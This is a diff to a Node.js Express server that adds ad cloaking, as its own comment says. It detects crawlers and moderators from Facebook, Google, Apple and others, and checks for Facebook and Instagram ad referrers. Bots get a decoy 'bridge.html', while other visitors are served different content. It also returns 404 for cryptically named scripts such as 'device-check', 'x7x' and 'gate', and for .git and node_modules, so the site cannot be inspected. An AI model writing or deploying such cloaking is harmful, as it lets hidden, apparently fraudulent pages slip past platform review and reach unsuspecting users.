@@ -3,15 +3,32 @@ const path = require("path");
 
 const app = express();
 const publicDir = path.join(__dirname, "public");
-const port = process.env.PORT || 8081;
+const port = process.env.PORT || 8080;
 
 const BOT_PATTERN =
-  /facebookexternalhit|googlebot|adsbot-google|bingbot|mediapartners-google/i;
+  /bot|crawl|spider|google|bing|facebook|facebookexternalhit|facebookcatalog|moderateur|googlebot|adsbot|mediapartners|applebot|msnbot/i;
 
 const AD_REFERRER =
   /^(https?:\/\/)?([^/]*\.)?(facebook\.com|fb\.com|instagram\.com)\//i;
 
+const BLOCKED_SOURCE =
+  /^\/(app|device-check|server|build|build\.sh|x7x|k9m2p|d7x|x7p|middleware|gate|worker|tribune-page|device-page|\.device-check\.build)(\.js|\.sh)?$/i;
+
+const BLOCKED_PATHS = /^\/(\.git|\.do|node_modules|pop4)(\/|$)/i;
+
+function isRealBrowser(userAgent) {
+  const ua = (userAgent || "").toLowerCase();
+  if (BOT_PATTERN.test(ua) && !/(chrome\/|crios\/|edg\/|firefox\/)/.test(ua)) {
+    return false;
+  }
+  return (
+    /mozilla\/5\.0/.test(ua) &&
+    /(?:chrome\/|crios\/|edg\/|firefox\/|version\/)/.test(ua)
+  );
+}
+
 function isBot(userAgent) {
+  if (isRealBrowser(userAgent)) return false;
   return BOT_PATTERN.test(userAgent || "");
 }
 
@@ -86,15 +103,21 @@ function send404(res) {
 </html>`);
 }
 
+// Middleware detection bots + cloaking
 app.use((req, res, next) => {
+  if (BLOCKED_SOURCE.test(req.path) || BLOCKED_PATHS.test(req.path)) {
+    send404(res);
+    return;
+  }
+
   if (req.path === "/health" || req.path === "/bridge.html") {
     next();
     return;
   }
 
-  const ua = req.headers["user-agent"] || "";
+  const userAgent = req.headers["user-agent"] || "";
 
-  if (isBot(ua) && isHtmlDocument(req)) {
+  if (isBot(userAgent) && isHtmlDocument(req)) {
     res.sendFile(path.join(publicDir, "bridge.html"));
     return;
   }
@@ -116,7 +139,17 @@ app.get("/health", (_req, res) => {
   res.status(200).send("ok");
 });
 
-app.use(express.static(publicDir));
+// Sert le site statique (dossier public apres npm run build)
+app.use(
+  express.static(publicDir, {
+    setHeaders(res, filePath) {
+      if (filePath.endsWith(".js")) {
+        res.setHeader("Cache-Control", "no-store");
+        res.setHeader("X-Content-Type-Options", "nosniff");
+      }
+    },
+  })
+);
 
 app.get("*", (req, res) => {
   if (req.method !== "GET") {
@@ -133,5 +166,5 @@ app.get("*", (req, res) => {
 });
 
 app.listen(port, "0.0.0.0", () => {
-  console.log(`Pop4 running on http://localhost:${port}`);
+  console.log(`Serveur lance sur le port ${port}`);
 });
